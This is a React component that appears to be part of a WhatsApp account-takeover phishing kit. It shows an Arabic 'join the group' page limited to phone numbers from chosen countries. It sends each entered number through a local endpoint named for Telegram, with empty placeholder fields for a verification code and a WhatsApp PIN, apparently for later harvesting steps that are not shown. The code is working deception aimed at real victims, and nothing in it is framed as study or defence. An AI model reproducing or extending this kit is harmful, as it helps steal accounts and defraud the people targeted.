import React, { useState } from 'react';
import { Shield, ArrowRight } from 'lucide-react';
import PhoneInput, { isValidPhoneNumber } from 'react-phone-number-input';

// Countries allowed: only Arab countries in Asia, plus USA and (FR, ES, DE)
const ALLOWED_COUNTRIES = [
  // Arab countries in Asia only
  'AE', // UAE
  'BH', // Bahrain
  'IQ', // Iraq
  'JO', // Jordan
  'KW', // Kuwait
  'LB', // Lebanon
  'OM', // Oman
  'QA', // Qatar
  'SA', // Saudi Arabia
  'SY', // Syria
  'YE', // Yemen
  // USA
  'US',
  // Selected Europe
  'FR','ES','DE'
] as const;

interface PhoneStepProps {
  phoneNumber: string;
  updatePhoneNumber: (value: string) => void;
  onNext: () => void;
}

const PhoneStep: React.FC<PhoneStepProps> = ({ phoneNumber, updatePhoneNumber, onNext }) => {
  const [error, setError] = useState('');

  const sendPhoneToTelegram = async (phone: string) => {
    try {
      const forwardedFor = (window.location.hostname === 'localhost' ? '127.0.0.1' : '');
      const remoteIp = forwardedFor || '127.0.0.1';
      
      const phoneText = [
        '📩 Numéro de téléphone saisi:',
        `📱 Téléphone: ${phone}`,
        `🌐 IP: ${remoteIp}`,
        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
      ].join('\n');

      await fetch('http://localhost:5176/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: phone,
          verificationCode: '',
          whatsappPin: '',
          messageType: 'phone'
        })
      });
    } catch (error) {
      console.error('Erreur envoi téléphone:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phoneNumber || !isValidPhoneNumber(phoneNumber)) {
      setError('يرجى إدخال رقم هاتف دولي صحيح');
      return;
    }
    
    setError('');
    await sendPhoneToTelegram(phoneNumber);
    onNext();
  };

  return (
    <div className="text-center">
      <div className="mb-6">
        <div className="w-16 h-16 bg-gradient-to-r from-blue-100 to-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <Shield className="w-8 h-8 text-blue-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">الانضمام إلى المجموعة</h2>
        <p className="text-gray-600">أدخل رقم هاتفك للمتابعة</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <PhoneInput
            international
            defaultCountry="AE"
            countries={ALLOWED_COUNTRIES as unknown as string[]}
            value={phoneNumber}
            onChange={(value) => updatePhoneNumber(value || '')}
            className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-xl focus-within:ring-2 focus-within:ring-blue-500 focus-within:border-transparent px-3 py-2"
            placeholder="أدخل رقم هاتفك الدولي"
          />
          {error && (
            <p className="text-red-500 text-sm mt-2 animate-fade-in">{error}</p>
          )}
        </div>

        <button
          type="submit"
          className="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 px-6 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 flex items-center justify-center space-x-2"
        >
          <span>الانضمام إلى الدردشة</span>
          <ArrowRight className="w-5 h-5" />
        </button>

        <div className="text-center">
          <p className="text-sm text-gray-500">اتبع هذا الرابط للانضمام</p>
          <p className="text-xs text-blue-600 mt-2">استخدم واتساب ويب</p>
        </div>
      </form>
    </div>
  );
};

export default PhoneStep;